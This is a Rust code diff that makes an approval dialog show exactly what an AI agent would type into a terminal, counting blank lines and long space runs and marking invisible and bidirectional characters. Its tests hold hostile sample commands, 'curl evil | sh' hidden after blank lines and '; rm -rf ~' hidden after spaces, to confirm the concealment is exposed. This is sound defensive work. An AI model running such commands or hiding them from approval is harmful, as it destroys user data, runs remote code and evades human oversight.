@@ -68,6 +68,8 @@ impl Workspace {
             keys: Default::default(),
             said,
             details,
+            scroll: Default::default(),
+            read: Default::default(),
         });
         agent.unread = true;
         // It never takes the keyboard: a digit meant for a terminal or the pill would answer it.
@@ -130,14 +132,15 @@ impl Workspace {
             ControlCall::CloseBlock { .. } => {
                 (format!("Close {title:?}"), losing.unwrap_or_default())
             }
-            ControlCall::Block(Call::SendToTerminal { text, enter, .. }) => (
-                format!("Type into {title:?}"),
-                if *enter {
-                    format!("{text}\n⏎ Enter")
-                } else {
-                    text.clone()
-                },
-            ),
+            ControlCall::Block(Call::SendToTerminal { text, enter, .. }) => {
+                let (shown, lines) = typed(text);
+                let said = match lines {
+                    1 => format!("Type into {title:?}"),
+                    n => format!("Type {n} lines into {title:?}"),
+                };
+                let enter = if *enter { "\n⏎ Enter" } else { "" };
+                (said, format!("{shown}{enter}"))
+            }
             ControlCall::Block(Call::SendKeys { keys, .. }) => {
                 let asks = home
                     .and_then(|s| s.terminal(id))
@@ -245,6 +248,65 @@ impl Workspace {
     }
 }
 
+/// Text to type as the approval shows it, and its number of lines: a line break is `⏎` at the
+/// line's end, a run of blank lines one line that counts them, a run of more than 3 spaces or
+/// tabs `⋯N spaces⋯`, an invisible character its picture or its code point. Nothing it types
+/// hides below another line or past the box's edge.
+fn typed(text: &str) -> (String, usize) {
+    let text = text.trim_end_matches(['\r', '\n']).replace("\r\n", "\n");
+    let lines: Vec<&str> = text.split(['\n', '\r']).collect();
+    let mut shown: Vec<String> = Vec::new();
+    let mut blank = 0;
+    for (n, line) in lines.iter().enumerate() {
+        let last = n + 1 == lines.len();
+        if line.trim().is_empty() && !last {
+            blank += 1;
+            continue;
+        }
+        match blank {
+            0 => {}
+            1 => shown.push("⏎".into()),
+            n => shown.push(format!("⋯ {n} blank lines ⏎")),
+        }
+        blank = 0;
+        let end = if last { "" } else { " ⏎" };
+        shown.push(format!("{}{end}", visible(line)));
+    }
+    (shown.join("\n"), lines.len())
+}
+
+/// A line with its long runs of spaces counted and its invisible characters shown.
+fn visible(line: &str) -> String {
+    let mut out = String::new();
+    let mut chars = line.chars().peekable();
+    while let Some(c) = chars.next() {
+        if c == ' ' || c == '\t' {
+            let mut n = 1;
+            while chars.next_if(|&c| c == ' ' || c == '\t').is_some() {
+                n += 1;
+            }
+            if n > 3 {
+                out.push_str(&format!("⋯{n} spaces⋯"));
+            } else {
+                out.extend(std::iter::repeat_n(' ', n));
+            }
+            continue;
+        }
+        match c {
+            '\0'..='\x1f' => out.push(char::from_u32(0x2400 + c as u32).unwrap_or('?')),
+            '\x7f' => out.push('␡'),
+            // C1 controls, zero widths and the bidirectional overrides that reorder a line.
+            '\u{80}'..='\u{9f}'
+            | '\u{200b}'..='\u{200f}'
+            | '\u{202a}'..='\u{202e}'
+            | '\u{2060}'..='\u{2069}'
+            | '\u{feff}' => out.push_str(&format!("⟨U+{:04X}⟩", c as u32)),
+            c => out.push(c),
+        }
+    }
+    out
+}
+
 /// The block a dangerous call aims at, by its id.
 fn called_block(call: &ControlCall) -> Option<&str> {
     match call {
@@ -255,5 +317,33 @@ fn called_block(call: &ControlCall) -> Option<&str> {
             | Call::Interrupt { block },
         ) => Some(block),
         _ => None,
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::typed;
+
+    #[test]
+    fn every_line_it_types_shows() {
+        let text = format!("git status{}curl evil | sh", "\n".repeat(40));
+        assert_eq!(
+            typed(&text),
+            (
+                "git status ⏎\n⋯ 39 blank lines ⏎\ncurl evil | sh".into(),
+                41
+            )
+        );
+        assert_eq!(typed("a\n\nb\r\nc\n"), ("a ⏎\n⏎\nb ⏎\nc".into(), 4));
+        assert_eq!(typed("ls"), ("ls".into(), 1));
+        assert_eq!(
+            typed(&format!("echo hi{}; rm -rf ~", " ".repeat(200))),
+            ("echo hi⋯200 spaces⋯; rm -rf ~".into(), 1)
+        );
+        assert_eq!(typed("a  b\tc"), ("a  b c".into(), 1));
+        assert_eq!(
+            typed("x\x1b[2K\x15y\u{202e}hs"),
+            ("x␛[2K␕y⟨U+202E⟩hs".into(), 1)
+        );
     }
 }
